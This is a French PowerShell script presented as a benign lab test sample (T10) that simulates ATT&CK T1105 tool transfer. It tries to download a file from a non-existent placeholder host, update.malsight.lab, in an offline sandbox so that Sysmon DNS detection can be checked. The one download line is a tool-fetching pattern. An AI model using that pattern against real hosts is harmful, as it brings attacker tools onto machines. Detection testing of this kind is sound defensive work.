<#
.SYNOPSIS
    Échantillon de test BÉNIN T10 : tentative de transfert d'outil (ATT&CK T1105).

.DESCRIPTION
    À exécuter UNIQUEMENT dans la Windows Sandbox du labo (réseau coupé).
    Tente de télécharger http://update.malsight.lab/outil.txt vers C:\travail\outil.txt.
    Le domaine n'existe pas et le réseau est coupé : l'échec est attendu, rien n'est
    téléchargé. Seule la requête DNS est observable (Sysmon EID 22).
    Vérité terrain : lab/verite-terrain/T10.json.

.PARAMETER Nettoyer
    Supprime le fichier cible s'il existe.
#>
param([switch]$Nettoyer)

$Url     = 'http://update.malsight.lab/outil.txt'
$Fichier = 'C:\travail\outil.txt'

if ($Nettoyer) {
    Remove-Item -Path $Fichier -ErrorAction SilentlyContinue
    Write-Host 'T10 : fichier supprimé.'
    return
}

Write-Host '=== T10 : tentative de téléchargement (test bénin) ===' -ForegroundColor Cyan
New-Item -ItemType Directory -Force -Path (Split-Path $Fichier) | Out-Null
try {
    Invoke-WebRequest -Uri $Url -OutFile $Fichier -UseBasicParsing -TimeoutSec 10
    Write-Host "[1] Téléchargement : $Url -> $Fichier (inattendu : le réseau devrait être coupé !)" -ForegroundColor Yellow
} catch {
    Write-Host "[1] Téléchargement : $Url -> échec attendu ($($_.Exception.Message))"
}
Write-Host 'T10 terminé.'
